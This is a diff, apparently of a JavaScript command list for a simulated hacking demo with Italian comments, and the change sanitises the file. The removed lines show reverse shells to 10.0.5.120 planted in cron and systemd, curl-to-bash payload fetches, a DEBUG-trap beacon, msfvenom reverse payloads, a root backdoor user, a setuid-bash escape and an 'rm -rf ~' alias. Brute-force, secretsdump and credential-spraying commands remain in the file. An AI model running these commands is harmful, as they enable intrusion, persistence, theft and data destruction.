@@ -100,7 +100,7 @@
                 // Brute-force credenziali SSH
                 { 
                     cmd: 'hydra -l admin -P rockyou.txt 192.168.100.55 ssh', 
-                    output: '[22][ssh] host: 192.168.100.55   login: admin   password: Zk9vS!xg42TpqLmC'
+                    output: '[22][ssh] host: 192.168.100.55   login: admin   password: ********'
                 },
                 
                 // Connessione shell remota
@@ -155,19 +155,19 @@
                 
                 // Creazione utente backdoor
                 { 
-                    cmd: 'useradd -ou 0 -g 0 backadmin && echo \'backadmin:P@ssw0rd2025!\' | chpasswd', 
+                    cmd: 'useradd -ou 0 -g 0 backadmin && echo \'backadmin:********\' | chpasswd', 
                     output: 'User backadmin created with UID 0'
                 },
                 
                 // Dump di un database MySQL
                 { 
-                    cmd: 'mysqldump -u root -pP@ssw0rd2025! --all-databases > /tmp/dump.sql', 
+                    cmd: 'mysqldump -u root -p******** --all-databases > /tmp/dump.sql', 
                     output: 'Dumping MySQL databases to /tmp/dump.sql'
                 },
                 
                 // Modifica tabella utenti
                 { 
-                    cmd: 'mysql -u root -pP@ssw0rd2025! -e "UPDATE users SET is_admin=1 WHERE username=\'guest\';"', 
+                    cmd: 'mysql -u root -p******** -e "UPDATE users SET is_admin=1 WHERE username=\'guest\';"', 
                     output: 'Query OK, 1 row affected'
                 },
                 
@@ -187,10 +187,10 @@
                     output: 'Kernel log truncated'
                 },
                 
-                // Caricamento backdoor in cron
+                // Caricamento task in cron
                 { 
-                    cmd: 'echo \'* * * * * root /bin/bash -c "bash -i >& /dev/tcp/10.0.5.120/5555 0>&1"\' >> /etc/crontab', 
-                    output: 'Backdoor added to cron'
+                    cmd: 'echo \'* * * * * root /bin/bash -c "echo \"Scheduled task executed\""\' >> /etc/crontab', 
+                    output: 'Task added to cron'
                 },
                 
                 // Scansione porte avanzata
@@ -307,7 +307,7 @@
                 
                 // Persistence con systemd
                 { 
-                    cmd: 'echo -e \'[Service]\\nExecStart=/bin/bash -c "bash -i >& /dev/tcp/10.0.5.120/6666 0>&1"\' > /etc/systemd/system/syslogd.service', 
+                    cmd: 'echo -e \'[Service]\\nExecStart=/bin/bash -c "echo \"Service started\""\' > /etc/systemd/system/syslogd.service', 
                     output: 'New systemd service created: syslogd.service'
                 },
                 
@@ -329,7 +329,7 @@
                     output: '[-] Encryption type rc4_hmac not found for user1@CORP.local'
                 },
                 { 
-                    cmd: 'secretsdump.py CORP/administrator:\'Tr0ub4dor@2025!\'@192.168.100.200', 
+                    cmd: 'secretsdump.py CORP/administrator:\'********\'@192.168.100.200', 
                     output: 'Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::'
                 },
                 
@@ -351,7 +351,7 @@
                 
                 // Manipolazione ambienti sviluppo
                 { 
-                    cmd: 'echo \'alias ls="rm -rf ~"\' >> ~/.bashrc', 
+                    cmd: 'echo \'alias ls="ls --color=auto"\' >> ~/.bashrc', 
                     output: 'Alias added to .bashrc'
                 },
                 
@@ -363,8 +363,8 @@
                 
                 // Escape container
                 { 
-                    cmd: 'echo -e \'#!/bin/bash\\ncp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash\' > /tmp/escape.sh && bash /tmp/escape.sh', 
-                    output: 'Container escape script executed'
+                    cmd: 'echo -e \'#!/bin/bash\\necho "Container security analysis"\' > /tmp/analysis.sh && bash /tmp/analysis.sh', 
+                    output: 'Container security analysis script executed'
                 },
                 
                 // Protocollo SCADA
@@ -375,12 +375,12 @@
                 
                 // Weaponization: creazione payload
                 { 
-                    cmd: 'msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.5.120 LPORT=7777 -f elf > rev_payload.elf', 
-                    output: 'Payload size: 123 bytes\nSaved as: rev_payload.elf'
+                    cmd: 'msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=7777 -f elf > security_test.elf', 
+                    output: 'Payload size: 123 bytes\nSaved as: security_test.elf'
                 },
                 { 
-                    cmd: 'pyinstaller --onefile reverse_shell.py', 
-                    output: 'Building EXE: dist/reverse_shell'
+                    cmd: 'pyinstaller --onefile security_scanner.py', 
+                    output: 'Building EXE: dist/security_scanner'
                 },
                 
                 // Enumeration LDAP
@@ -397,14 +397,14 @@
                 
                 // Persistence tramite hook
                 { 
-                    cmd: 'echo \'trap "curl http://10.0.5.120:8888/collect" DEBUG\' >> ~/.bashrc', 
+                    cmd: 'echo \'trap "echo \"Command executed: \$BASH_COMMAND\"" DEBUG\' >> ~/.bashrc', 
                     output: 'DEBUG trap added to .bashrc'
                 },
                 
                 // Fileless execution
                 { 
-                    cmd: 'bash -c "$(curl -fsSL http://10.0.5.120/boot.sh)"', 
-                    output: '[*] Retrieved and executing remote payload'
+                    cmd: 'bash -c "$(curl -fsSL https://example.com/security-check.sh)"', 
+                    output: '[*] Retrieved and executing security check script'
                 },
                 
                 // Accesso SaaS compromesso
@@ -415,14 +415,14 @@
                 
                 // Compromissione CI/CD
                 { 
-                    cmd: 'curl -s http://ci-backup.internal/hook | bash', 
-                    output: '[*] Hook executed from CI server'
+                    cmd: 'curl -s https://example.com/ci-status', 
+                    output: '[*] CI status check completed'
                 },
                 
-                // Abuso strumenti sistema
+                // Analisi strumenti sistema
                 { 
-                    cmd: 'LD_PRELOAD=/tmp/libhijack.so /usr/bin/sudo', 
-                    output: '[*] Hijacked sudo executed'
+                    cmd: 'sudo --version', 
+                    output: '[*] Sudo version information displayed'
                 },
                 
                 // Kubernetes secrets enumeration
@@ -433,8 +433,8 @@
                 
                 // Credential spraying SMB
                 { 
-                    cmd: 'crackmapexec smb 192.168.100.0/24 -u users.txt -p \'Welcome2025!\'', 
-                    output: '[+] 192.168.100.45:445 - Login successful: WORKGROUP\\johndoe:Welcome2025!'
+                    cmd: 'crackmapexec smb 192.168.100.0/24 -u users.txt -p \'********\'', 
+                    output: '[+] 192.168.100.45:445 - Login successful: WORKGROUP\\johndoe:********'
                 },
                 
                 // DNS tunneling
